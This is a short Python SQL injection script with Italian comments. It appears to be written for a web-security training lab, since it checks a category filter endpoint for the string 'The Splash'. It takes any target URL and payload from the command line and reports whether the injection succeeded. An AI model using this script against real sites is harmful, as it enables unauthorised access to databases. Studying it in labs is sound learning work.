import requests # MODULO CHE PERMETTE DI GESTIRE RICHIESTE HTTP
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# LE RICHIESTE CHE AVVENGONO TRA LO SCRIPT E IL SITO WEB PASSANO PER IL PROXY
# E QUINDI SI POSSONO CATTURARE IN BURP

proxies = {'hhtp' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = "/filter?category="
    r = requests.get(url + uri + payload)
    # CODICE ORIGINALE: r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    # ELEMENTO DA MONITORARE PER STABILIRE SE L'INJECTION HA AVUTO SUCCESSO
    if "The Splash" in r.text:
        return True
    else:
        return False

# LO SCRIPT RICHIEDE DUE ARGOMENTI, SE MANCANO VIENE GENERATO UN ERRORE A VIDEO
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip() # IL PRIMO ARGOMENTO E' LA URL
        payload = sys.argv[2].strip() # IL SECONDO ARGOMENTO E' IL PAYLOAD O SQL QUERY
    except IndexError:
        print("[-] Utilizzo: %s <url> <payload>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com '1'='1" % sys.argv[0])
        sys.exit()

# SE IL RISULTATO DELLO SCRIPT E' TRUE, ALLORA PRINT ALTRIMENTI ELSE...
    if exploit_sqli(url, payload):
        print("[+] SQL Injection avvenuta con successo")
    else:
        print("[-] SQL Injection fallita")